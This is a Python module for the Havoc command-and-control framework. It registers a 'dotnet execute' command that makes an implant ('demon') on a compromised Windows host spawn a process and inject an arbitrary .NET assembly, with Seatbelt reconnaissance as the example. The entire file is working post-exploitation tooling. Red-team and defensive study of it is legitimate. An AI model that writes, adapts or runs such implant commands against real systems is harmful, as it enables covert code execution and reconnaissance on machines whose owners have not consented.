
from havoc import Demon, RegisterCommand

def InvokeAssembly( demonID, *param ):
    TaskID   : str    = None
    demon    : Demon  = None
    Assembly : str    = None
    packer   = Packer()

    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon spawn and inject an assembly executable" )
    
    if len( param ) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return

    try:
        with open( param[ 0 ], 'rb' ) as Assembly:
            AssemblyBytes = Assembly.read()

        packer.addstr( "DefaultAppDomain" )
        packer.addstr( "v4.0.30319" )
        packer.addbytes( AssemblyBytes )
        parts = []
        for arg in param[ 1: ]:
            if ' ' in arg:
                parts.append( '"' + arg + '"' )
            else:
                parts.append( arg )
        packer.addstr( " " + ' '.join( parts ) )

    except OSError:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Failed to open assembly file: " + param[ 0 ] )
        return

    arg = packer.getbuffer() 

    demon.DllSpawn( TaskID, f"bin/InvokeAssembly.{demon.ProcessArch}.dll", arg )

    return TaskID

RegisterCommand( InvokeAssembly, "dotnet", "execute", "executes a dotnet assembly in a seperate process", 0, "[/path/to/assembl.exe] (args)", "/tmp/Seatbelt.exe -group=user" )
